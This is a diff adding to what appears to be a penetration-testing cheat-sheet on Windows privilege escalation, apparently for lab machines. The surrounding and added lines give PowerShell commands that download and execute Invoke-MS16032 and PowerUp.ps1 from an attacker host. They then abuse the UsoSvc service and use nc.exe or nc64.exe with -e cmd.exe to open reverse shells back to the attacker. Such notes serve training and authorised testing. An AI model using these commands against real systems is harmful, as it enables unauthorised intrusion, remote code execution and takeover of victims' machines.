@@ -373,7 +373,15 @@ Password Protected SSH Private Key:
 	- Example of chaining commands on windows: C:\temp> C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
 
 
-			
+	- PowerUp.ps1:
+		- Once you get a cmd shell, turn it to a powershell: powershell
+		- Download PowerUp.ps1 on attacker
+		- Serve it
+		- On Victim 
+			- IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/PowerUp.ps1')
+			- Invoke-AllChecks
+			- If applicable: Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command "C:\Windows\Temp\nc64.exe 10.10.14.9 1234 -e cmd.exe"
+		
 
 		
 		
